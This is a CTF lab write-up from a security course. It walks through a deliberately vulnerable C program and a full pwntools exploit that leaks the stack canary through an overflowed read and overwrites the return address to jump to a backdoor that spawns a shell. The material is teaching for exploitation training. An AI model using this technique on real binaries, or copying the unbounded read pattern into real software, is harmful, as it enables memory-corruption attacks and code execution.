# Simple Buffer Overflow - 0x05(Leak Canary)
###### tags: `CTF` `PWN` `eductf`

## Canary Background
![](https://imgur.com/onxC8Aq.png)

## Original Code
```clike!
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

void backdoor()
{
    system("/bin/sh");
}

int main()
{
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);

    char name[0x10];
    char phone[0x10];

    printf("What's your name: ");
    read(0, name, 0x100);
    printf("Hello, %s !", name);

    printf("What's your phone number: ");
    read(0, phone, 0x100);

    return 0;
}
```

* Note that, if you establish the code yourself, you must turn off the protection by the command below and use `checksec` to observe the protection
    ```bash!
    gcc -o bof2_leak_canary bof2_leak_canary.c -zexecstack -no-pie -z norelro
    ```
    ![](https://imgur.com/u5iueTC.png)
    
## Exploit
* First, we can use `objdump -d -M Intel {filename}` to check the address of backdoor → `0x4011b6`
![](https://imgur.com/d30qIvL.png)
* However, we observe the backdoor function, it just call `system` instead of `execsv`. So, that you may encounter some error because of non-alignment. The solution is skip the `push %rbp` instruction and just jump to <font color="FF0000">`0x4011bb`</font>
    * The detailed description can refer to [lecture video](https://youtu.be/ktoVQB99Gj4?t=3058)
* Then we can construct a part of the payload below:
    ```python!
    from pwn import *

    context.arch = 'amd64'

    r = process('./bof2_leak_canary')
    raw_input()
    no_push_rbp_backdoor_addr = 0x4011bb
    ```
* Then we have to overlap `name` variable and `phone` variable with length `0x20`. In addition, the compiler will align 8 bytes, we should overlap it as well. Moreover, the last byte of `canary` is always `0x00`, then if we'd like to print out `canary` value, we should overlap it as well.(In pwntools, `recvuntil` function default consider `0x00` is a new line)
    ```python!
    r.sendafter("What's your name: ", b'a' * 0x29) #0x20 → name + phone / 0x08 for compiler alinment / 0x01 for canary last byte
    r.recvuntil('a'*0x29)
    canary = u64(b'\x00' + r.recv(7))
    print("canary: ", hex(canary))
    ```

* Final step, we do what we done before to overlap padding + `phone` variable`(0x18)` + original canary`(0x08)` + original `$rbp``(0x08)` + overlap `$rip` to backdoor.
    ```python!
    r.sendafter("What's your phone number: ", b'a' * 0x18 + p64(canary) + p64(0xdeadbeef) + p64(no_push_rbp_backdoor_addr))
    ```

* The whole payload is shown as below:
    ```python!
    from pwn import *

    context.arch = 'amd64'

    r = process('./bof2_leak_canary')
    raw_input()
    no_push_rbp_backdoor_addr = 0x4011bb
    r.sendafter("What's your name: ", b'a' * 0x29) #0x20 → name + phone / 0x08 for compiler alinment / 0x01 for canary last byte
    r.recvuntil('a'*0x29)
    canary = u64(b'\x00' + r.recv(7))
    print("canary: ", hex(canary))
    r.sendafter("What's your phone number: ", b'a' * 0x18 + p64(canary) + p64(0xdeadbeef) + p64(no_push_rbp_backdoor_addr))
    ```
* Then we got shell
![](https://imgur.com/9EGkDS0.png)

## Analysis
* About how to print canary:
Use `gdb` and execute to the first `print`, you can see that the stack structure.
![](https://imgur.com/usVpBMk.png)
![](https://imgur.com/6UDd5Po.png)
And we can print canary value from payload program → <font color="FF0000">`0xdf38469d4e106500`</font>
![](https://imgur.com/4tpr5M7.png)
    * Note that we can get `tls` address and `+0x28` to compare with canary value
    ![](https://imgur.com/gOMyuAq.png)


## Reference
[Lecture Vid. - Pwn week1](https://youtu.be/ktoVQB99Gj4)